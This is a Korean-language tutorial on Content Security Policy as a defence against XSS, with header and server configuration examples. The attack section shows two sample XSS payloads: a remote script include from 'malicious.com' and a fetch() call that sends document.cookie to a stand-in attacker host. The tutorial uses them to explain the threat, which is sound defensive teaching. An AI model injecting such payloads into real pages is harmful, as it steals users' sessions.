## 📌 **Content Security Policy (CSP)**

### 개요

\*\*Content Security Policy (CSP)\*\*는 웹 애플리케이션에서 **크로스 사이트 스크립팅(XSS)** 및 **데이터 삽입 공격**을 방어하기 위한 **보안 메커니즘**입니다. CSP는 **브라우저**가 **허용된 리소스**만 로드하도록 지시하는 정책을 설정하여, **악성 코드**나 **스크립트**가 외부 출처에서 실행되는 것을 방지합니다.

### 공격 방식

웹 애플리케이션에 **CSP**가 없거나 적절하게 설정되지 않으면, 악성 사용자가 **XSS 공격**을 통해 **스크립트**를 삽입하거나 **외부 자원을** 로드할 수 있습니다. 공격자는 이를 통해 세션 하이재킹, 데이터 탈취, 서버 제어 등 다양한 공격을 수행할 수 있습니다.

#### 예시 공격

1. 악성 사용자가 댓글을 작성하거나, **폼 입력 필드**에 **JavaScript 코드**를 삽입할 수 있습니다.

   ```html
   <script src="http://malicious.com/malicious.js"></script>
   ```

   이 코드가 **허용된 웹 페이지에 삽입되면**, 외부 스크립트가 실행됩니다.

2. **XSS 공격**을 통해 사용자의 **세션 쿠키**를 탈취할 수도 있습니다.

   ```javascript
   <script>
       fetch('http://malicious.com/steal-cookies', {
           method: 'POST',
           body: document.cookie
       });
   </script>
   ```

### 🛡️ 방어법

#### 1. **CSP 적용**

* **CSP 헤더**를 사용하여 **허용된 출처**에서만 자원을 로드할 수 있게 제한합니다. 이를 통해 **외부 악성 스크립트**의 실행을 방지할 수 있습니다.

#### 예시: 기본적인 CSP 헤더

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; img-src 'self';
```

이 정책은 다음을 의미합니다:

* **default-src 'self'**: 기본적으로 모든 리소스는 **현재 도메인**에서만 로드 가능합니다.
* **script-src 'self' [https://trusted.com](https://trusted.com)**: 스크립트는 **현재 도메인**과 \*\*[https://trusted.com\*\*에서만](https://trusted.com**에서만) 로드 가능합니다.
* **img-src 'self'**: 이미지는 **현재 도메인**에서만 로드 가능합니다.

#### 2. **인라인 스크립트 차단**

* CSP를 통해 **인라인 자바스크립트**(`<script>`)의 실행을 차단할 수 있습니다. 이렇게 하면 **XSS 공격**이 포함된 인라인 스크립트가 실행되지 않게 됩니다.

```http
Content-Security-Policy: script-src 'self' 'nonce-randomvalue';
```

* **nonce**는 실행되는 스크립트에 대한 **임시 허가 값**입니다. 이를 사용하면 특정 스크립트만 실행할 수 있습니다.

#### 3. **서버에서 CSP 헤더 설정**

웹 서버에서 **CSP** 헤더를 설정하여 **응답 헤더에 포함**시킬 수 있습니다. 예를 들어, **Apache** 서버에서는 `.htaccess` 파일을 수정하여 CSP를 설정할 수 있습니다.

**Apache 예시**:

```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted.com;"
```

#### 4. **`report-uri` 또는 `report-to` 사용**

CSP 위반 사항을 추적하고, 위반 시 서버에 보고할 수 있습니다. 이를 통해 **CSP 위반**을 실시간으로 감지하고, 보안 문제를 모니터링할 수 있습니다.

예시:

```http
Content-Security-Policy: default-src 'self'; report-uri /csp-violation-report-endpoint;
```

이 경우, 위반이 발생하면 `/csp-violation-report-endpoint`에 관련 정보를 전송하게 됩니다.

#### 5. **스크립트, 스타일, 이미지 및 리소스의 특정 출처만 허용**

* CSP를 사용하여 **스크립트**, **스타일**, **이미지** 등 각 리소스 유형에 대해 세부적으로 **출처를 제한**할 수 있습니다.
* **스크립트**는 **자바스크립트 파일**의 **출처**를, **이미지**는 **이미지 URL**의 **출처**를 제한할 수 있습니다.

예시:

```http
Content-Security-Policy: script-src 'self' https://trusted.com; img-src 'self' https://images.example.com;
```

#### 6. **`strict-dynamic`**

* \*\*`strict-dynamic`\*\*은 `CSP`에서 스크립트 로드와 관련된 **동적 로딩**을 더욱 엄격하게 제한하는 기능입니다.
* `strict-dynamic`을 사용하면, **신뢰할 수 있는 스크립트만**이 **동적으로 로드**될 수 있습니다. 즉, **스크립트 태그**나 **동적 로드**가 **서버에서 정의한 신뢰된 소스**에서만 이루어지게 됩니다.

동작 원리
* `strict-dynamic`을 사용하면, **`script-src`** 지시어에 **출처**(예: `'self'`, `'unsafe-inline'`)를 설정해도, 그 출처에서 **로드된 스크립트만**이 **다시 다른 스크립트를 로드**할 수 있게 됩니다.
* **예시**로, 서버에서 신뢰된 스크립트를 로드한 후에는, 그 스크립트가 추가적인 스크립트를 로드하는 것이 허용됩니다. 하지만 **그 외의 스크립트**는 전혀 로드되지 않습니다.

예시:

```http
Content-Security-Policy: script-src 'self' 'strict-dynamic'; object-src 'none';
```

* `script-src`에서 정의된 **신뢰된 출처**에서만 스크립트가 로드될 수 있습니다.
* 로드된 스크립트가 추가적인 스크립트를 동적으로 로드할 수 있지만, 그 외의 **외부 스크립트**는 **차단**됩니다.
* `strict-dynamic`은 \*\*`nonce`\*\*와 결합될 때 가장 효과적입니다. `nonce`를 사용하여 특정 스크립트만 실행하도록 하고, `strict-dynamic`을 사용하여 그 스크립트가 **다른 스크립트를 로드**할 수 있도록 제한합니다.


---

### 적용 예시

#### **HTML 페이지의 헤더에 CSP 설정**

```html
<head>
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted.com; img-src 'self';">
</head>
```

#### **PHP에서 CSP 헤더 설정**

```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com;");
```

#### **Node.js (Express)에서 CSP 헤더 설정**

```javascript
app.use(function(req, res, next) {
  res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' https://trusted.com;");
  next();
});
```

---

### **결론**

* \*\*CSP(Content Security Policy)\*\*는 웹 애플리케이션의 **보안을 강화**하고, \*\*크로스 사이트 스크립팅(XSS)\*\*과 **데이터 삽입 공격**을 방어하는 중요한 **보안 기능**입니다.
* **CSP 헤더**를 통해 **허용된 출처**에서만 자원을 로드하게 하여 **악성 스크립트**의 실행을 방지합니다.
* **CSP 설정**은 다양한 방법으로 적용할 수 있으며, **정확한 리소스 출처**를 지정하고, **인라인 스크립트 실행**을 제한하는 방식으로 효과적인 방어가 가능합니다.
